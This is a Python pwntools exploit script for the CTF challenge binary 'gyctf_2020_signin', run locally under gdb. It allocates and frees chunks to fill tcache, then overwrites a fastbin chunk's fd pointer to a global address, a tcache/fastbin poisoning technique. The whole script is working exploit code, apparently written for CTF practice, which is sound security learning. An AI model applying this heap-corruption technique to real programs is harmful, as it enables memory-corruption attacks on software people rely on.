from pwn import *

context.log_level = 'debug'

r = process('./gyctf_2020_signin')
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
gdb.attach(proc.pidof(r)[0],gdbscript="b main")

def add(idx):
    r.sendlineafter('your choice?',str(1))
    r.sendlineafter('idx?',str(idx))

def edit(idx,context):
    r.sendlineafter('your choice?',str(2))
    r.sendlineafter('idx?',str(idx))
    r.send(context)

def delete(idx):
    r.sendlineafter('your choice?',str(3))
    r.sendlineafter('idx?',str(idx))
def add_all(index):
    for i in range(index):
        add(i)
def delete_all(index):
    for j in range(index):
        delete(j)
add_all(8) # add(0)...add(7)
delete_all(8)#0-6 Tcache 7 Fastbin
add(8) # malloc 6 from Tcache
payload = p64(0x4040c0-0x10).decode("iso-8859-1").ljust(0x50,'\x00')

edit(7,payload) 

r.sendlineafter('your choice?', '6') # calloc 7 from Fastbin and modify fd

r.interactive()
